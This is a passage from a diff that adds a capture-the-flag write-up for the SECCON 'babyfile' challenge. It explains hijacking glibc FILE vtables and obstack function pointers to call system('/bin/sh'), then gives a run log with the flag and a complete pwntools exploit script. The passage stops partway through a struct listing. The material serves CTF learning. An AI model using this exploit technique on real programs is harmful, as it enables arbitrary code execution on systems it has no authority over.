+  <span style="color:#6272a4">/* Compute an aligned object_base in the new chunk */</span>
+  object_base <span style="color:#ff79c6">=</span>
+    __PTR_ALIGN ((<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>) new_chunk, new_chunk<span style="color:#ff79c6">-&gt;</span>contents, h<span style="color:#ff79c6">-&gt;</span>alignment_mask);
+
+  <span style="color:#6272a4">/* Move the existing object to the new chunk.
+</span><span style="color:#6272a4">     Word at a time is fast and is safe if the object
+</span><span style="color:#6272a4">     is sufficiently aligned.  */</span>
+  <span style="color:#ff79c6">if</span> (h<span style="color:#ff79c6">-&gt;</span>alignment_mask <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&gt;=</span> DEFAULT_ALIGNMENT)
+    {
+      <span style="color:#ff79c6">for</span> (i <span style="color:#ff79c6">=</span> obj_size <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">sizeof</span> (COPYING_UNIT) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>;
+	   i <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0</span>; i<span style="color:#ff79c6">--</span>)
+	((COPYING_UNIT <span style="color:#ff79c6">*</span>) object_base)[i]
+	  <span style="color:#ff79c6">=</span> ((COPYING_UNIT <span style="color:#ff79c6">*</span>) h<span style="color:#ff79c6">-&gt;</span>object_base)[i];
+      <span style="color:#6272a4">/* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,
+</span><span style="color:#6272a4">	 but that can cross a page boundary on a machine
+</span><span style="color:#6272a4">	 which does not do strict alignment for COPYING_UNITS.  */</span>
+      already <span style="color:#ff79c6">=</span> obj_size <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">sizeof</span> (COPYING_UNIT) <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">sizeof</span> (COPYING_UNIT);
+    }
+  <span style="color:#ff79c6">else</span>
+    already <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+  <span style="color:#6272a4">/* Copy remaining bytes one by one.  */</span>
+  <span style="color:#ff79c6">for</span> (i <span style="color:#ff79c6">=</span> already; i <span style="color:#ff79c6">&lt;</span> obj_size; i<span style="color:#ff79c6">++</span>)
+    object_base[i] <span style="color:#ff79c6">=</span> h<span style="color:#ff79c6">-&gt;</span>object_base[i];
+
+  <span style="color:#6272a4">/* If the object just copied was the only data in OLD_CHUNK,
+</span><span style="color:#6272a4">     free that chunk and remove it from the chain.
+</span><span style="color:#6272a4">     But not if that chunk might contain an empty object.  */</span>
+  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>h<span style="color:#ff79c6">-&gt;</span>maybe_empty_object
+      <span style="color:#ff79c6">&amp;&amp;</span> (h<span style="color:#ff79c6">-&gt;</span>object_base
+	  <span style="color:#ff79c6">==</span> __PTR_ALIGN ((<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>) old_chunk, old_chunk<span style="color:#ff79c6">-&gt;</span>contents,
+			  h<span style="color:#ff79c6">-&gt;</span>alignment_mask)))
+    {
+      new_chunk<span style="color:#ff79c6">-&gt;</span>prev <span style="color:#ff79c6">=</span> old_chunk<span style="color:#ff79c6">-&gt;</span>prev;
+      CALL_FREEFUN (h, old_chunk);
+    }
+
+  h<span style="color:#ff79c6">-&gt;</span>object_base <span style="color:#ff79c6">=</span> object_base;
+  h<span style="color:#ff79c6">-&gt;</span>next_free <span style="color:#ff79c6">=</span> h<span style="color:#ff79c6">-&gt;</span>object_base <span style="color:#ff79c6">+</span> obj_size;
+  <span style="color:#6272a4">/* The new chunk certainly contains no empty object yet.  */</span>
+  h<span style="color:#ff79c6">-&gt;</span>maybe_empty_object <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+}
+<span style="color:#ff79c6"># ifdef _LIBC
+</span><span style="color:#ff79c6"></span>libc_hidden_def (_obstack_newchunk)
+<span style="color:#ff79c6"># endif
+</span></code></pre></div><p>The interesting part of the function is the call to the <code>CALL_CHUNKFUN</code> macro that calls a raw <em>unencrypted</em> function pointer referenced by the <code>obstack</code> structure with either a controlled argument (<code>(h)-&gt;extra_arg</code>) or only with the size.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6"># define CALL_FREEFUN(h, old_chunk) \
+</span><span style="color:#ff79c6">  do { \
+</span><span style="color:#ff79c6">      if ((h)-&gt;use_extra_arg)						      \
+</span><span style="color:#ff79c6">	(*(h)-&gt;freefun)((h)-&gt;extra_arg, (old_chunk));			      \
+</span><span style="color:#ff79c6">      else								      \
+</span><span style="color:#ff79c6">	(*(void (*)(void *))(h)-&gt;freefun)((old_chunk));		      \
+</span><span style="color:#ff79c6">    } while (0)
+</span></code></pre></div><p>If I summarize, to call <code>system(&quot;/bin/sh&quot;</code> we need to have:</p>
+<ul>
+<li><code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code></li>
+<li><code>(h)-&gt;freefun</code> = <code>&amp;system</code></li>
+<li><code>(h)-&gt;extra_arg</code> = <code>&amp;&quot;/bin/sh&quot;</code></li>
+<li><code>(h)-&gt;use_extra_arg</code> != 0</li>
+</ul>
+<p>Which gives:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">_IO_obstack_jumps <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1E9260</span>
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;_IO_obstack_jumps: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(_IO_obstack_jumps)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+<span style="color:#6272a4"># edit vtable =&gt; _IO_obstack_jumps</span>
+write_ptr(pwn<span style="color:#ff79c6">.</span>p64(_IO_obstack_jumps <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">9</span>), File<span style="color:#ff79c6">.</span>vtable)
+write_ptr(pwn<span style="color:#ff79c6">.</span>p64(heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2a0</span>), File<span style="color:#ff79c6">.</span>obstack)
+
+partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0xff</span>), File<span style="color:#ff79c6">.</span>_IO_read_base)
+
+write_ptr(pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>system), obstack<span style="color:#ff79c6">.</span>chunkfun) <span style="color:#6272a4"># fn ptr, system</span>
+write_ptr(pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#8be9fd;font-style:italic">next</span>(libc<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;/bin/sh&#39;</span>))), obstack<span style="color:#ff79c6">.</span>extra_arg) <span style="color:#6272a4"># arg</span>
+partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#ff79c6">True</span>), obstack<span style="color:#ff79c6">.</span>use_extra_arg)
+
+fflush()
+<span style="color:#6272a4"># system(&#34;/bin/sh&#34;)</span>
+</code></pre></div><h1 id="profit">PROFIT</h1>
+<p>After optimizing a lot my exploit (my french connection sucks), here we are:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nasm@off:~/Documents/pwn/seccon/babyfile$ <span style="color:#8be9fd;font-style:italic">time</span> python3 exploit.py REMOTE <span style="color:#8be9fd;font-style:italic">HOST</span><span style="color:#ff79c6">=</span>babyfile.seccon.games <span style="color:#8be9fd;font-style:italic">PORT</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">3157</span>
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#39;/home/nasm/Documents/pwn/seccon/babyfile/chall&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#39;/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Opening connection to babyfile.seccon.games on port 3157: Done
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> libc: 0x7fe2bc538000
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> heap: 0x55fd27776000
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> _IO_obstack_jumps: 0x7fe2bc721260
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Switching to interactive mode
+SECCON<span style="color:#ff79c6">{</span>r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3<span style="color:#ff79c6">}</span>
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Got EOF <span style="color:#ff79c6">while</span> reading in interactive
+$
+</code></pre></div><h1 id="annexes">Annexes</h1>
+<p>Final exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#!/usr/bin/env python</span>
+<span style="color:#6272a4"># -*- coding: utf-8 -*-</span>
+
+<span style="color:#6272a4"># this exploit was generated via</span>
+<span style="color:#6272a4"># 1) pwntools</span>
+<span style="color:#6272a4"># 2) ctfmate</span>
+
+<span style="color:#ff79c6">import</span> os
+<span style="color:#ff79c6">import</span> time
+<span style="color:#ff79c6">import</span> pwn
+
+
+<span style="color:#6272a4"># Set up pwntools for the correct architecture</span>
+exe <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(<span style="color:#f1fa8c">&#39;chall&#39;</span>)
+libc <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(<span style="color:#f1fa8c">&#39;libc-2.31.so&#39;</span>)
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>delete_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>rename_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
+<span style="color:#6272a4"># pwn.context.timeout = 1000</span>
+
+host <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>HOST <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>
+port <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>PORT <span style="color:#ff79c6">or</span> <span style="color:#bd93f9">1337</span>)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">local</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>debug([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, gdbscript<span style="color:#ff79c6">=</span>gdbscript, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>process([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">remote</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+    io <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>connect(host, port)
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>attach(io, gdbscript<span style="color:#ff79c6">=</span>gdbscript)
+    <span style="color:#ff79c6">return</span> io
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>LOCAL:
+        <span style="color:#ff79c6">return</span> local(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> remote(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+
+gdbscript <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;
+</span><span style="color:#f1fa8c">source /home/nasm/Downloads/pwndbg/gdbinit.py
+</span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>format(<span style="color:#ff79c6">**</span><span style="color:#8be9fd;font-style:italic">locals</span>())
+
+io <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">None</span>
+io <span style="color:#ff79c6">=</span> start()
+
+<span style="color:#ff79c6">class</span> <span style="color:#50fa7b">File</span>:
+    flags          <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0</span>
+    _IO_read_base  <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">24</span>
+    _IO_read_end   <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x10</span>
+    _IO_write_base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x20</span>
+    _IO_write_ptr  <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x28</span>
+    _IO_write_end  <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x30</span>
+    _IO_buf_base   <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x38</span>
+    _IO_buf_end    <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40</span>
+    fileno         <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x70</span>
+    vtable         <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xd8</span>
+    obstack       <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xe0</span>
+
+<span style="color:#ff79c6">class</span> <span style="color:#50fa7b">obstack</span>:
+    chunkfun       <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">56</span>
+    extra_arg      <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">56</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">16</span>
+    use_extra_arg  <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">56</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">16</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">fflush</span>():
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span>)
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">trick</span>(offt, data):
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;2&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;offset: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(offt)<span style="color:#ff79c6">.</span>encode())
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;value: &#34;</span>, data)
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">leave</span>():
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;0&#34;</span>)
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">write_ptr</span>(ptr: <span style="color:#8be9fd;font-style:italic">bytes</span>, offt: <span style="color:#8be9fd;font-style:italic">int</span>, debug<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>):
+    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">8</span>):
+        <span style="color:#ff79c6">if</span> ptr[i]:
+            trick(offt <span style="color:#ff79c6">+</span> i, <span style="color:#8be9fd;font-style:italic">str</span>(ptr[i])<span style="color:#ff79c6">.</span>encode())
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">partial_write2</span>(ptr: <span style="color:#8be9fd;font-style:italic">bytes</span>, offt: <span style="color:#8be9fd;font-style:italic">int</span>):
+    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">2</span>):
+        trick(offt <span style="color:#ff79c6">+</span> i, <span style="color:#8be9fd;font-style:italic">str</span>(ptr[i])<span style="color:#ff79c6">.</span>encode())
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">partial_write</span>(ptr: <span style="color:#8be9fd;font-style:italic">bytes</span>, offt: <span style="color:#8be9fd;font-style:italic">int</span>):
+    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">1</span>):
+        trick(offt <span style="color:#ff79c6">+</span> i, <span style="color:#8be9fd;font-style:italic">str</span>(ptr[i])<span style="color:#ff79c6">.</span>encode())
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">leak_ptr</span>(ptr: <span style="color:#8be9fd;font-style:italic">bytes</span>) <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">int</span>:
+    write_ptr(ptr, File<span style="color:#ff79c6">.</span>_IO_write_base)
+    
+    dest <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd;font-style:italic">int</span><span style="color:#ff79c6">.</span>from_bytes(ptr, byteorder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;little&#34;</span>)<span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>)<span style="color:#ff79c6">.</span>to_bytes(<span style="color:#bd93f9">8</span>, byteorder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;little&#39;</span>)
+
+    write_ptr(dest, File<span style="color:#ff79c6">.</span>_IO_write_ptr)
+
+    fflush()
+    ret <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+
+    <span style="color:#ff79c6">return</span> ret
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">main</span>():
+    <span style="color:#6272a4"># do_allocate</span>
+    partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0xa8</span>), File<span style="color:#ff79c6">.</span>vtable)
+    fflush()
+
+    <span style="color:#6272a4"># _IO_file_underflow =&gt; _IO_default_pbackfail</span>
+    partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0x60</span>), File<span style="color:#ff79c6">.</span>vtable)
+    fflush()
+
+    <span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">    int
+</span><span style="color:#f1fa8c">    _IO_default_pbackfail (FILE *fp, int c)
+</span><span style="color:#f1fa8c">    =&gt; not _IO_IN_BACKUP         0x0100
+</span><span style="color:#f1fa8c">    =&gt; _IO_read_base == _IO_write_ptr
+</span><span style="color:#f1fa8c">    =&gt; _IO_read_end == _IO_write_ptr + 8
+</span><span style="color:#f1fa8c">    =&gt; _IO_write_end = right size
+</span><span style="color:#f1fa8c">    &#34;&#34;&#34;</span>
+
+    write_ptr(pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0xfbad1800</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0x8000</span>), File<span style="color:#ff79c6">.</span>flags)
+
+    partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0x70</span>), File<span style="color:#ff79c6">.</span>_IO_write_base)
+
+    partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0x78</span>), File<span style="color:#ff79c6">.</span>_IO_write_ptr)
+    partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0xa0</span>), File<span style="color:#ff79c6">.</span>vtable)
+    write_ptr(pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">1</span>), File<span style="color:#ff79c6">.</span>fileno)
+    fflush()
+
+    leak <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2160c0</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2d160</span>
+    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(leak)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+    libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> leak
+
+    leak_main_arena <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1ed5a0</span>
+
+    heap <span style="color:#ff79c6">=</span> leak_ptr(pwn<span style="color:#ff79c6">.</span>p64(leak_main_arena)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2a0</span>
+    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+    _IO_obstack_jumps <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1E9260</span>
+    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;_IO_obstack_jumps: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(_IO_obstack_jumps)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+    <span style="color:#6272a4"># edit vtable =&gt; _IO_obstack_jumps</span>
+    write_ptr(pwn<span style="color:#ff79c6">.</span>p64(_IO_obstack_jumps <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">9</span>), File<span style="color:#ff79c6">.</span>vtable)
+    write_ptr(pwn<span style="color:#ff79c6">.</span>p64(heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2a0</span>), File<span style="color:#ff79c6">.</span>obstack)
+
+    partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0xff</span>), File<span style="color:#ff79c6">.</span>_IO_read_base)
+
+    write_ptr(pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>system), obstack<span style="color:#ff79c6">.</span>chunkfun) <span style="color:#6272a4"># fn ptr, system</span>
+    write_ptr(pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#8be9fd;font-style:italic">next</span>(libc<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;/bin/sh&#39;</span>))), obstack<span style="color:#ff79c6">.</span>extra_arg) <span style="color:#6272a4"># arg</span>
+    partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#ff79c6">True</span>), obstack<span style="color:#ff79c6">.</span>use_extra_arg)
+
+    fflush()
+    <span style="color:#6272a4"># system(&#34;/bin/sh&#34;)</span>
+
+    io<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;cat flag-f81d1f481db83712a1128dc9b72d5503.txt&#34;</span>)
+    io<span style="color:#ff79c6">.</span>interactive()
+
+<span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+    main()
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">type = struct _IO_FILE {
+</span><span style="color:#f1fa8c">/*      0      |       4 */    int _flags;
+</span><span style="color:#f1fa8c">/* XXX  4-byte hole      */
+</span><span style="color:#f1fa8c">/*      8      |       8 */    char *_IO_read_ptr;
+</span><span style="color:#f1fa8c">/*     16      |       8 */    char *_IO_read_end;
+</span><span style="color:#f1fa8c">/*     24      |       8 */    char *_IO_read_base;
+</span><span style="color:#f1fa8c">/*     32      |       8 */    char *_IO_write_base;
+</span><span style="color:#f1fa8c">/*     40      |       8 */    char *_IO_write_ptr;
+</span><span style="color:#f1fa8c">/*     48      |       8 */    char *_IO_write_end;
+</span><span style="color:#f1fa8c">/*     56      |       8 */    char *_IO_buf_base;
+</span><span style="color:#f1fa8c">/*     64      |       8 */    char *_IO_buf_end;
+</span><span style="color:#f1fa8c">/*     72      |       8 */    char *_IO_save_base;
+</span><span style="color:#f1fa8c">/*     80      |       8 */    char *_IO_backup_base;
+</span><span style="color:#f1fa8c">/*     88      |       8 */    char *_IO_save_end;
+</span><span style="color:#f1fa8c">/*     96      |       8 */    struct _IO_marker *_markers;
+</span><span style="color:#f1fa8c">/*    104      |       8 */    struct _IO_FILE *_chain;
+</span><span style="color:#f1fa8c">/*    112      |       4 */    int _fileno;
+</span><span style="color:#f1fa8c">/*    116      |       4 */    int _flags2;
+</span><span style="color:#f1fa8c">/*    120      |       8 */    __off_t _old_offset;
+</span><span style="color:#f1fa8c">/*    128      |       2 */    unsigned short _cur_column;
+</span><span style="color:#f1fa8c">/*    130      |       1 */    signed char _vtable_offset;
+</span><span style="color:#f1fa8c">/*    131      |       1 */    char _shortbuf[1];
+</span><span style="color:#f1fa8c">/* XXX  4-byte hole      */
+</span><span style="color:#f1fa8c">/*    136      |       8 */    _IO_lock_t *_lock;
+</span><span style="color:#f1fa8c">/*    144      |       8 */    __off64_t _offset;
+</span><span style="color:#f1fa8c">/*    152      |       8 */    struct _IO_codecvt *_codecvt;
+</span><span style="color:#f1fa8c">/*    160      |       8 */    struct _IO_wide_data *_wide_data;
+</span><span style="color:#f1fa8c">/*    168      |       8 */    struct _IO_FILE *_freeres_list;
+</span><span style="color:#f1fa8c">/*    176      |       8 */    void *_freeres_buf;
+</span><span style="color:#f1fa8c">/*    184      |       8 */    size_t __pad5;
+</span><span style="color:#f1fa8c">/*    192      |       4 */    int _mode;
+</span><span style="color:#f1fa8c">/*    196      |      20 */    char _unused2[20];
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">                               /* total size (bytes):  216 */
+</span><span style="color:#f1fa8c">                             }
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">struct obstack          /* control current object in current chunk */
+</span><span style="color:#f1fa8c">{
+</span><span style="color:#f1fa8c">  long chunk_size;              /* preferred size to allocate chunks in */
+</span><span style="color:#f1fa8c">  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
+</span><span style="color:#f1fa8c">  char *object_base;            /* address of object we are building */
